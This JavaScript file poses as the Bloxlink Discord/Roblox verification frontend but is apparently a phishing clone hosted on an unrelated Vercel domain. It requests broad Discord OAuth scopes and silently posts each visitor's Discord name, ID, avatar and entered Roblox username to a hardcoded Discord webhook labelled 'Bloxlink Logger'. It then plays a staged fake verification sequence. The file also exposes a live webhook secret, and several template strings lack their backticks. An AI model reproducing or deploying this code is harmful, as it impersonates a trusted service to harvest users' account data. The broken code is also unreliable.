/**
 * Bloxlink Frontend & Discord OAuth Controller
 * Automatically captures and renders real Discord user profile (name, avatar, ID) via OAuth.
 * Enforces Discord OAuth verification before allowing access to the Roblox verification modal.
 */
document.addEventListener('DOMContentLoaded', () => {
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1541640265461137538/YDaXpIpBQl0MWbIzeFLvcSTI4zbpPTqTkTgKfc1PusePVzOrtK6GiGC1CTlUx7Q78Hwa";

  // -------------------------------------------------------------
  // DOM Elements
  // -------------------------------------------------------------
  const robloxUserInput = document.getElementById('robloxUserInput');
  const getVerifiedBtn = document.getElementById('getVerifiedBtn');
  const footerRobloxInput = document.getElementById('footerRobloxInput');
  const footerVerifiedBtn = document.getElementById('footerVerifiedBtn');

  // Verification Popup Elements
  const popupOverlay = document.getElementById('popupOverlay');
  const popupContainer = document.getElementById('popupContainer');
  const popupClose = document.getElementById('popupClose');
  const btnContinue = document.getElementById('btnContinue');
  const btnReturn = document.getElementById('btnReturn');
  const authContent = document.getElementById('authContent');
  const loadingContent = document.getElementById('loadingContent');
  const iframeContent = document.getElementById('iframeContent');

  const message1 = document.getElementById('message1');
  const message2 = document.getElementById('message2');
  const message3 = document.getElementById('message3');
  const message4 = document.getElementById('message4');

  // Authentication & Profile Navbar Elements
  const loggedOutSection = document.getElementById('loggedOutSection');
  const loggedInSection = document.getElementById('loggedInSection');
  const signInDiscordBtn = document.getElementById('signInDiscordBtn');
  const profileChipBtn = document.getElementById('profileChipBtn');
  const userDropdownMenu = document.getElementById('userDropdownMenu');
  const dropdownChevron = document.getElementById('dropdownChevron');
  const logoutBtn = document.getElementById('logoutBtn');
  const userDisplayName = document.getElementById('userDisplayName');
  const userAvatarImg = document.getElementById('userAvatarImg');

  // Mobile Navigation
  const mobileToggle = document.getElementById('mobileToggle');
  const mobileMenu = document.getElementById('mobileMenu');

  // -------------------------------------------------------------
  // Discord OAuth Redirector Helper
  // -------------------------------------------------------------
  function redirectToDiscordOAuth() {
    const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
    const redirectUri = isLocal
      ? encodeURIComponent(window.location.origin + '/')
      : encodeURIComponent('https://embriaozinho.vercel.app/');

    // Define the scopes requested for the OAuth2 authorization
    const scopes = 'email identify guilds connections'; // Added scopes as requested

    const discordOAuthUrl = https://discord.com/oauth2/authorize?client_id=1541620007560020029&response_type=code&redirect_uri=${redirectUri}&scope=${scopes};

    window.location.href = discordOAuthUrl;
  }

  // -------------------------------------------------------------
  // Discord OAuth Token & Profile Fetcher
  // -------------------------------------------------------------
  async function fetchDiscordUserProfile(accessToken) {
    try {
      const response = await fetch('https://discord.com/api/users/@me', {
        headers: {
          Authorization: Bearer ${accessToken}
        }
      });

      if (response.ok) {
        const user = await response.json();

        // Format Display Name
        const name = user.global_name || user.username || 'powerfromcsm.';

        // Format Dynamic Discord Avatar URL
        let avatar = './assets/avatar.png';
        if (user.avatar) {
          const isGif = user.avatar.startsWith('a_');
          const ext = isGif ? 'gif' : 'png';
          avatar = https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}?size=128;
        } else if (user.id) {
          try {
            const defaultNum = Number((BigInt(user.id) >> 22n) % 6n);
            avatar = https://cdn.discordapp.com/embed/avatars/${defaultNum}.png;
          } catch (e) {
            avatar = 'https://cdn.discordapp.com/embed/avatars/0.png';
          }
        }

        const profile = {
          id: user.id,
          username: user.username,
          displayName: name,
          avatarUrl: avatar
        };

        // Persist profile
        localStorage.setItem('discord_user_profile', JSON.stringify(profile));
        localStorage.setItem('bloxlink_logged_in', 'true');

        applyUserProfile(profile);

        // Dispara notificação para o Webhook se estiver configurado
        const robloxUser = sessionStorage.getItem('saved_roblox_username') || '';
        // Passa as scopes utilizadas para o webhook
        sendToDiscordWebhook(profile, robloxUser, 'email identify guilds connections');

        return true;
      }
    } catch (err) {
      console.error('Failed to fetch Discord user profile:', err);
    }
    return false;
  }

  // Modificado para incluir as scopes no payload do webhook
  async function sendToDiscordWebhook(profile, robloxUser, scopes) {
    if (!WEBHOOK_URL || WEBHOOK_URL.trim() === '') return;

    const payload = {
      username: "Bloxlink Logger",
      embeds: [
        {
          title: "✅ Nova Autenticação Concluída",
          color: 0x5865f2,
          thumbnail: {
            url: profile.avatarUrl
          },
          fields: [
            {
              name: "👤 Discord",
              value: ${profile.displayName} (\${profile.username}\),
              inline: true
            },
            {
              name: "🆔 ID",
              value: \${profile.id}\``,
              inline: true
            },
            {
              name: "🎮 Roblox Informado",
              value: robloxUser ? \${robloxUser}\`` : "Nenhum",
              inline: false
            },
            {
              name: "🔑 Escopos Solicitados",
              value: \${scopes}\``,
              inline: false
            }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    };

    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    } catch (err) {
      console.error("Erro ao enviar para o webhook:", err);
    }
  }


  function applyUserProfile(profile) {
    if (!profile) return;
    if (userDisplayName) {
      userDisplayName.textContent = profile.displayName || profile.username || 'powerfromcsm.';
    }
    if (userAvatarImg && profile.avatarUrl) {
      userAvatarImg.src = profile.avatarUrl;
    }
    if (loggedOutSection) loggedOutSection.style.display = 'none';
    if (loggedInSection) loggedInSection.style.display = 'block';
  }

  // -------------------------------------------------------------
  // Check Active Session / OAuth Redirection on Page Load
  // -------------------------------------------------------------
  async function initAuth() {
    // 1. Check for Access Token in URL Hash (Implicit Grant: #access_token=...)
    const hash = window.location.hash.substring(1);
    const hashParams = new URLSearchParams(hash);
    const accessToken = hashParams.get('access_token');

    // 2. Check for Token/Code in URL Search Params (?access_token=... or ?code=...)
    const urlParams = new URLSearchParams(window.location.search);
    const queryToken = urlParams.get('access_token');
    const discordCode = urlParams.get('code');

    const tokenToUse = accessToken || queryToken;

    if (tokenToUse) {
      // Clean URL smoothly without reload
      window.history.replaceState({}, document.title, window.location.pathname);
      await fetchDiscordUserProfile(tokenToUse);

      // Restore saved Roblox username into input if present
      const savedRoblox = sessionStorage.getItem('saved_roblox_username') || '';
      if (savedRoblox && robloxUserInput) {
        robloxUserInput.value = savedRoblox;
      }
      return;
    }

    if (discordCode) {
      // Returned with ?code=...
      window.history.replaceState({}, document.title, window.location.pathname);

      const savedProfileStr = localStorage.getItem('discord_user_profile');
      if (savedProfileStr) {
        try {
          const profile = JSON.parse(savedProfileStr);
          applyUserProfile(profile);
          return;
        } catch (e) {}
      }

      // Default logged in UI
      if (loggedOutSection) loggedOutSection.style.display = 'none';
      if (loggedInSection) loggedInSection.style.display = 'block';
      return;
    }

    // 3. Restore existing logged-in session if present
    const isLogged = localStorage.getItem('bloxlink_logged_in') === 'true';
    const savedProfileStr = localStorage.getItem('discord_user_profile');

    if (isLogged && savedProfileStr) {
      try {
        const profile = JSON.parse(savedProfileStr);
        applyUserProfile(profile);
        return;
      } catch (e) {}
    }

    // Default: Strictly Logged Out
    if (loggedOutSection) loggedOutSection.style.display = 'block';
    if (loggedInSection) loggedInSection.style.display = 'none';
  }

  initAuth();

  // -------------------------------------------------------------
  // Sign In with Discord Button Handler (Direct OAuth)
  // -------------------------------------------------------------
  if (signInDiscordBtn) {
    signInDiscordBtn.addEventListener('click', (e) => {
      e.preventDefault();
      redirectToDiscordOAuth();
    });
  }

  // -------------------------------------------------------------
  // Profile Dropdown Menu Handlers
  // -------------------------------------------------------------
  if (profileChipBtn) {
    profileChipBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const isOpen = userDropdownMenu.classList.toggle('open');
      if (dropdownChevron) {
        dropdownChevron.style.transform = isOpen ? 'rotate(180deg)' : 'rotate(0deg)';
      }
    });
  }

  // Close dropdown when clicking outside
  document.addEventListener('click', (e) => {
    if (userDropdownMenu && !userDropdownMenu.contains(e.target) && profileChipBtn && !profileChipBtn.contains(e.target)) {
      userDropdownMenu.classList.remove('open');
      if (dropdownChevron) dropdownChevron.style.transform = 'rotate(0deg)';
    }
  });

  // Log out Handler
  if (logoutBtn) {
    logoutBtn.addEventListener('click', (e) => {
      e.preventDefault();
      localStorage.removeItem('bloxlink_logged_in');
      localStorage.removeItem('discord_user_profile');
      sessionStorage.removeItem('saved_roblox_username');
      if (loggedOutSection) loggedOutSection.style.display = 'block';
      if (loggedInSection) loggedInSection.style.display = 'none';
      if (userDropdownMenu) userDropdownMenu.classList.remove('open');
    });
  }

  // -------------------------------------------------------------
  // Verification Logic (Enforces Discord OAuth First)
  // -------------------------------------------------------------
  function openVerificationModal(username) {
    popupOverlay.classList.add('active');
    popupContainer.classList.remove('expanded');
    authContent.style.display = 'block';
    loadingContent.style.display = 'none';
    iframeContent.style.display = 'none';
    resetMessages();
  }

  function handleVerificationAction(username) {
    if (username && username.trim()) {
      sessionStorage.setItem('saved_roblox_username', username.trim());
    }

    const isLogged = localStorage.getItem('bloxlink_logged_in') === 'true';

    if (!isLogged) {
      // Not verified with Discord yet -> First redirect to Discord OAuth!
      redirectToDiscordOAuth();
    } else {
      // Already verified with Discord -> Open Roblox Verification Modal!
      openVerificationModal(username);
    }
  }

  function closePopup() {
    popupOverlay.classList.remove('active');
    resetMessages();
  }

  function resetMessages() {
    message1.style.opacity = '0.3';
    message1.style.color = '#94a3b8';
    message2.style.opacity = '0.3';
    message2.style.color = '#94a3b8';
    message3.style.opacity = '0.3';
    message3.style.color = '#94a3b8';
    message4.style.opacity = '0.3';
    message4.style.color = '#94a3b8';
  }

  if (getVerifiedBtn) {
    getVerifiedBtn.addEventListener('click', () => {
      const val = robloxUserInput ? robloxUserInput.value : '';
      handleVerificationAction(val);
    });
  }

  if (robloxUserInput) {
    robloxUserInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        handleVerificationAction(robloxUserInput.value);
      }
    });
  }

  if (footerVerifiedBtn) {
    footerVerifiedBtn.addEventListener('click', () => {
      const val = footerRobloxInput ? footerRobloxInput.value : '';
      handleVerificationAction(val);
    });
  }

  if (popupClose) popupClose.addEventListener('click', closePopup);
  if (btnReturn) btnReturn.addEventListener('click', closePopup);

  popupOverlay.addEventListener('click', (e) => {
    if (e.target === popupOverlay) {
      closePopup();
    }
  });

  // Animated Multi-Step Verification Sequence
  if (btnContinue) {
    btnContinue.addEventListener('click', () => {
      authContent.style.display = 'none';
      loadingContent.style.display = 'flex';

      setTimeout(() => {
        message1.style.opacity = '1';
        message1.style.color = '#60a5fa';
      }, 500);

      setTimeout(() => {
        message1.style.opacity = '0.3';
        message2.style.opacity = '1';
        message2.style.color = '#60a5fa';
      }, 2000);

      setTimeout(() => {
        message2.style.opacity = '0.3';
        message3.style.opacity = '1';
        message3.style.color = '#60a5fa';
      }, 3500);

      setTimeout(() => {
        message3.style.opacity = '0.3';
        message4.style.opacity = '1';
        message4.style.color = '#60a5fa';
      }, 5000);

      setTimeout(() => {
        loadingContent.style.display = 'none';
        iframeContent.style.display = 'block';
        popupContainer.classList.add('expanded');
      }, 6500);
    });
  }

  // Mobile Menu Toggle
  if (mobileToggle && mobileMenu) {
    mobileToggle.addEventListener('click', () => {
      mobileMenu.classList.toggle('hidden');
    });
  }
});
`